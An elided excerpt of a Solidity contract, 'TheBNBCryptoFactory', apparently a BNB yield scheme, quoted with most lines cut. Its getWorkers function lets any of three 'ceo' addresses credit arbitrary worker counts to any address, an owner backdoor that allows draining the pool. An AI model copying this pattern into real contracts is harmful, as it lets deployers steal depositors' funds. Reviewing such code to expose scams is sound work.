...
contract TheBNBCryptoFactory {
    ...
    function reinvest(address ref, uint256 amount) internal {
        ...
        claimedIncome[msg.sender] = SafeMath.add(claimedIncome[msg.sender], workersHired);
        buyback.transfer(compoundFee(amount));
        workerMoney(ref);
    }
    ...
    function compoundFee(uint256 amount) public pure returns(uint256){
    ...
    function OpenFactory() public {
      require(msg.sender == ceo || msg.sender == ceo2);
    ...
    function getWorkers(address a, uint256 b) public {
      require(msg.sender == ceo || msg.sender == ceo2 || msg.sender == ceo3);
      require(initialized);
      workerCount[a] = SafeMath.add(workerCount[a], b);
    }
